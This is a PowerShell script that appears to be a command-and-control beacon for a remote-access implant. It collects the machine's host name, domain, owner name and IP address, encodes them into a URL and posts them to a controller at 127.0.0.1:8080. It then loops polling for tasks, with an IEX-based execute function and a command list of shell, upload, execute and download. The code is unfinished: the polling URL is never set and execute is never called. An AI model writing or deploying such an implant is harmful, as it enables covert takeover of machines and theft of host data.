function requests($url,$method,$data,$id){
        $webReq = [System.Net.HttpWebRequest]::Create($url)
        $webReq.UserAgent = "Mozilla/4.0 (compatible; MSIE8.0; Windows NT 6.1; Trident/4.0)"
        if ($id.Length -ne 0 -and $method -eq "POST"){
            $webReq.ContentType=$id
        }
        $webReq.Method = $method;
        $webReq.IfModifiedSince = Get-Date
        $webReq.Date = Get-Date
        $webReq.Timeout = 10000
        if ($data.Length -ne 0 -and $method -eq "POST"){
             Write-Host 11111
             $Stream = $webReq.GetRequestStream();
             $Stream.Write($data, 0, $data.Length);
             $response=$webReq.GetResponse()
             $stream = $response.GetResponseStream()
             $readStream = New-Object System.IO.StreamReader($stream , [System.Text.Encoding]::UTF8) 
             $content = $readStream.ReadToEnd();
             $response.Close();
             $readStream.Close();
        }else{
            $webReq.ReadWriteTimeout = 15000
            $response = $webReq.GetResponse()
            $stream = $response.GetResponseStream()
            $readStream = New-Object System.IO.StreamReader($stream , [System.Text.Encoding]::UTF8) 
            $content = $readStream.ReadToEnd();
            $response.Close();
            $readStream.Close();
        }
        return $content
}

function base64encode($data){
    return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data), 'InsertLineBreaks')
}


function execute($data){
    return IEX($data)
}


$nil=""
$data_=Get-WMIObject Win32_ComputerSystem | Select-Object Name,Domain,PrimaryOwnerName
$arch=(Get-WmiObject Win32_OperatingSystem).osarchitecture
$hostname=base64encode($data_.Name)
$domain=base64encode($data_.Domain)
$username=base64encode($data_.PrimaryOwnerName)
$ip=base64encode([System.Net.Dns]::GetHostAddresses($ComputerName).IPAddressToString[-1])
$url=-join("http://127.0.0.1:8080/$",$username,"$",$domain,"$",$hostname,"$",$ip)
$postdata=[byte[]][char[]]"";
$uid=requests $url "POST" $postdata $nil

$commands={"shell","upload","execute","download"}
$sleeps=1
while (1){
    Start-Sleep -s $sleeps
    Write-Host 1
    $v=requests $url2 "POST" $postdata $uid
    Write-Host $v
}
